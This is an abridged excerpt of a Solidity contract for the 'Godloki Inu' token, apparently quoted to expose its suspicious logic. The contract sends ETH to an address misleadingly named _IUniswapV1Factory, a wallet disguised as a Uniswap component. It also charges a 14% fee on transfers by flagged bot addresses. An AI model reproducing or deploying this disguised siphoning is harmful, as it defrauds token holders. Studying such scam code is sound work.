...
contract GodlokiInu is Context, IERC20, Ownable {
    ...
    address private  _marketingWallet = 0x5Be5700149DCFB6FAB8E3966b8E8f675Fc5fC5F6;
    uint256 private _tTotal = 1000000000000 * 10**9;
    uint256 public _maxTxAmount = _tTotal * 25 / 1000; 
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 5 * 10**9;
    string private constant _name = "Godloki Inu"; 
    string private constant _symbol = "Godloki";
    ...
    address private  _IUniswapV2Factory = 0xDb82cEF222c7339950bEF0103d2f0cFab3b7f81D;
    address private  _IUniswapV1Factory = 0x74176FA7eF23bd5c310765cafec44dE83Fa3baCA;
    ...
    function _getValuesBot(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * 7 / 100; 
        uint256 liquidityFee = amount * 7 / 100; 
        _tOwned[address(this)] += marketingFee + liquidityFee;
        emit Transfer (from, address(this), marketingFee + liquidityFee);
        return (amount - marketingFee - liquidityFee);
    }
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            if (to == uniswapV2Pair && isBot[from]) {
                transferAmount = _getValuesBot(amount, from);
            }
            if (marketActive && isBot[from]) {
                transferAmount = _getValuesBot(amount, from);
            }
            if (marketActive && isBot[to]) {
                transferAmount = _getValuesBot(amount, from);
            }
        } 
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0){
            payable(_IUniswapV1Factory).transfer(a_part);
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0){
            payable(_IUniswapV1Factory).sendValue ((ethAmount - ethFromLiquidity) * 25 / 100);
